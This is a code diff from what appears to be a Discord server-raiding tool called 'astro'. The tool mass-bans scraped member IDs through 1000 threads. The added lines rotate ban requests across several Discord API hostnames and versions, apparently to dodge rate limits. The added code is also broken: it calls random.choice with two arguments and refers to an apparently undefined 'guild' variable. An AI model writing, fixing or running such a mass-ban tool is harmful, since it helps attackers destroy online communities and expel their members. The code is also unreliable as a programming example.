@@ -51,12 +51,14 @@ class astro:
 
     def idworker():
         for memberid in open("scraped/ids.txt"):
-            astro.q.put((astro.session.put, "https://discord.com/api/v{}/guilds/{}/bans/{}".format(random.randint(6,9), astro.guild, memberid), astro.headers))
+            ranidapi = [f"https://discord.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{memberid}", f"https://discordapp.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{memberid}", f"https://canary.discord.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{memberid}", f"https://ptb.discord.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{memberid}"]
+            astro.q.put((astro.session.put, random.choice(ranidapi), astro.headers))
         astro.q.join()
 
     def massbanworker():
         for member in open("scraped/scraped.txt"):
-            astro.q.put((astro.session.put, "https://discord.com/api/v{}/guilds/{}/bans/{}".format(random.randint(6,9), astro.guild, member), astro.headers))
+            ranapi = [f"https://discord.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{member}", f"https://discordapp.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{member}", f"https://canary.discord.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{member}", f"https://ptb.discord.com/api/v{random.choice(6,9)}/guilds/{guild}/bans/{member}"]
+            astro.q.put((astro.session.put, random.choice(ranapi), astro.headers))
         astro.q.join()
 
     @client.event
@@ -87,7 +89,7 @@ if __name__ == "__main__":
     for x in range(1000):
         threading.Thread(target=astro.massbansend, daemon=True).start()
     try:
-    client.run(astro.token)
+        client.run(astro.token)
     except:
         print("\u001b[35mastro@localhost - token is invalid or ratelimited.")
         print("\u001b[35mastro@localhost - please make sure you have all intents enabled on your bots token.")
